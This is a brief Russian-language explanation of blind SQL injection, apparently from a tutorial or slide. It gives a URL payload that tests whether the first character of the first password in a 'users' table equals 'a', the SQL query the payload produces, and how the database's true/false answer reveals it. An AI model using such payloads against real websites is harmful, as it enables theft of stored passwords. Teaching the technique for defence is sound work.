Подбор первого символа у первой записи в таблице /?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),1,1))=97,555,777) • SQL запрос примет вид SELECT id, name from table where id =1 AND 555=if(ord(mid((select pass from userslimit 0,1),1,1))=97,555,777) • В случае, если таблица «users» содержит колонку «pass» и первый символ первой записи этой колонки равен 97 (символ «a») то, СУБД вернет TRUE. В противном случае – FALSE.
